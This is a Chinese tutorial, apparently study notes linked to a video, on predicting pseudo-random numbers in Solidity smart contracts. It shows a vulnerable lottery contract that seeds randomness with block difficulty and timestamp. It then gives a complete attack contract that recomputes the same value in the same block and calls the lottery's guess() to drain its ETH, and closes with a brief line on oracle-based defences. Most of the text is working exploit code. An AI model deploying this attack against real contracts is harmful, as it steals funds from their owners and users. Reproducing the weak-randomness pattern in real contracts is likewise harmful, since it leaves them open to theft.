## 随机数攻击

* https://www.bilibili.com/video/BV1Dd4y1d7Ht/
* 预测伪随机数，达到攻击目的，例如一个奇数中奖游戏：
```solidity
contract Random{
	//生成随机数确定是否中奖，如中奖则转账给中奖者
  function guess() public payable{
    bool result = _getRandom(); //获取随机数
    if(result){					//中奖转账
      bool ok = payable(msg.sender).send(1 ether);
      if(!ok){
      }
    }
  }

  function _getRandom() private view returns(bool){
    uint256 random = uint256(keccak256(abi.encodePacked(block.difficulty, block.timestamp)));
    //block.difficulty, block.timestamp 是可以预测的
  //区块难度，区块时间戳
    if(random % 2 == 0){
      return false;		//随机数是偶数没中奖
    }
    else{						//奇数代表中奖
      return true;
    }
  }

  function getBalance() external view returns(uint256){
    return address(this).balance;
  }

  constructor() payable{}

  receive() external payable{}
}
```


* 攻击合约伪代码如下：
```solidity
contract Attack{
	function attack() external payable{
		result = calcRandom();
		if(result){	//判断是否中奖
			guess(); //调用攻击目标的guess函数
		}
	}
}
```
* 由于攻击合约和漏洞合约会在同一个block中运行，那么区块难度和时间戳是相同的，其作为随机数可被“预测”
```solidity
contract Attack{
	event Log(string);
	function attack(address _random) external payable{
		for(;;){ //判断目标合约的余额，如果小于1个ether，表示取光，返回
		if(payable(_random).balance <1){
			emit Log("successed getting ETH");
			return;
		}
		//计算当前区块的难度值和时间戳产生的哈希值，用作随机数
		//如果随机数是偶数，表示本区块不会中奖，先返回，等待下一个区块
		if(uint256(keccak256(abi.encodePacked(block.difficulty,block.timestamp))) %2==0){
			emit Log("failed to get rand, wait 10 seconds");
			return;
		}
		//如果随机数是奇数，表示中奖，立刻调用攻击目标合约的guess函数
		(bool ok,) = _random.call(abi.encodeWithSignature("guess()"));
		if(!ok){
			emit Log("failed to call guess()");
			return;
		}
		}
	}
		function getBalance() external view returns(uint256){
		return address(this).balance;
	}
}

```
* 防御：random.org, chainlink, 自建oracle随机数生成器

## 完整代码
```
contract Random{
	//生成随机数确定是否中奖，如中奖则转账给中奖者
  function guess() public payable{
    bool result = _getRandom(); //获取随机数
    if(result){					//中奖转账
      bool ok = payable(msg.sender).send(1 ether);
      if(!ok){
      }
    }
  }

  function _getRandom() private view returns(bool){
    uint256 random = uint256(keccak256(abi.encodePacked(block.difficulty, block.timestamp)));
    //block.difficulty, block.timestamp 是可以预测的
  //区块难度，区块时间戳
    if(random % 2 == 0){
      return false;		//随机数是偶数没中奖
    }
    else{						//奇数代表中奖
      return true;
    }
  }

  function getBalance() external view returns(uint256){
    return address(this).balance;
  }

  constructor() payable{}

  receive() external payable{}
}

contract Attack{
	event Log(string);
	function attack(address _random) external payable{
		for(;;){ //判断目标合约的余额，如果小于1个ether，表示取光，返回
		if(payable(_random).balance <1){
			emit Log("successed getting ETH");
			return;
		}
		//计算当前区块的难度值和时间戳产生的哈希值，用作随机数
		//如果随机数是偶数，表示本区块不会中奖，先返回，等待下一个区块
		if(uint256(keccak256(abi.encodePacked(block.difficulty,block.timestamp))) %2==0){
			emit Log("failed to get rand, wait 10 seconds");
			return;
		}
		//如果随机数是奇数，表示中奖，立刻调用攻击目标合约的guess函数
		(bool ok,) = _random.call(abi.encodeWithSignature("guess()"));
		if(!ok){
			emit Log("failed to call guess()");
			return;
		}
		}
	}
		function getBalance() external view returns(uint256){
		return address(this).balance;
	}
}
```
